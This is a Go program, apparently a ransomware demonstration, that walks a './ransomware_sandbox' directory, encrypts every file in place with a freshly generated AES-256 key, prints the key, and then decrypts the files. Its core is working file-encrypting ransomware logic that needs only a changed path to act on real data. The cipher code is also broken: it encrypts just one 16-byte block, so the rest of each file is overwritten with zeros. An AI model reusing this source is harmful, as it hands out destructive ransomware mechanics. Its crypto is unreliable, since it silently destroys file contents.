package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/rand"
	"fmt"
	"log"
	"os"
	"path/filepath"
)

// listFiles returns a list of files in the given directory
func listFiles(path string, files *[]string) error {
	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			*files = append(*files, filePath)
		}
		return nil
	})
	return err
}

// generateAES256Key generates a 256-bit AES key
func generateAES256Key(keyLengthBit uint) ([]byte, error) {
	key := make([]byte, int(keyLengthBit/8))
	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

// aes256Encrypt encrypts the given plaintext using AES-256 with PKCS7 padding
func encryptFileWithAES256(filePath string, key []byte) error {
	// Read the file content
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	fileStat, err := file.Stat()
	if err != nil {
		return err
	}

	// Encrypt the file content using AES-256 with PKCS7 padding
	fileContentByteStream := make([]byte, fileStat.Size())
	_, err = bufio.NewReader(file).Read(fileContentByteStream)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	// Apply PKCS7 padding
	fileContentByteStream = pkcs7Pad(fileContentByteStream, aes.BlockSize)

	cipherText := make([]byte, aes.BlockSize+len(fileContentByteStream))
	block.Encrypt(cipherText[aes.BlockSize:], fileContentByteStream)

	// Write the encrypted content back to the file
	err = os.WriteFile(filePath, cipherText, 0644)
	if err != nil {
		return err
	}

	return nil
}

// Decrypt the file content using AES-256 with PKCS7 unpadding
func decryptFileWithAES256(filePath string, key []byte) error {
	// Read the file content
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	fileStat, err := file.Stat()
	if err != nil {
		return err
	}

	// Decrypt the file content using AES-256
	cipherText := make([]byte, fileStat.Size())
	_, err = bufio.NewReader(file).Read(cipherText)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	// Decrypt and remove PKCS7 padding
	plainText := make([]byte, len(cipherText)-aes.BlockSize)
	block.Decrypt(plainText, cipherText[aes.BlockSize:])
	plainText = pkcs7Unpad(plainText)

	// Write the decrypted content back to the file
	err = os.WriteFile(filePath, plainText, 0644)
	if err != nil {
		return err
	}

	return nil
}

// pkcs7Pad pads the input to the specified block size using PKCS7 padding
func pkcs7Pad(input []byte, blockSize int) []byte {
	padding := blockSize - (len(input) % blockSize)
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(input, padText...)
}

// pkcs7Unpad removes PKCS7 padding from the input
func pkcs7Unpad(input []byte) []byte {
	padding := int(input[len(input)-1])
	return input[:len(input)-padding]
}

func main() {

	// Specify targets to encrypt
	path := "./ransomware_sandbox"
	var files []string

	err := listFiles(path, &files)
	if err != nil {
		log.Fatalf("Error while walking filepaths: %v", err)
		return
	}

	// Generate a 256-bit AES key
	key, err := generateAES256Key(256)
	if err != nil {
		log.Panic(err)
	}

	fmt.Printf("AES-256 Key: %x\n", key)

	// Encrypt the files using AES-256
	for _, file := range files {
		fmt.Printf("File(encrypt): %s\n", file)
		err := encryptFileWithAES256(file, key)
		if err != nil {
			log.Fatalf("Error while encrypting file: %v", err)
			continue
		}
	}

	// Decrypt the files using AES-256
	for _, file := range files {
		fmt.Printf("File(decrypt): %s\n", file)
		err := decryptFileWithAES256(file, key)
		if err != nil {
			log.Fatalf("Error while decrypting file: %v", err)
			continue
		}
	}
}
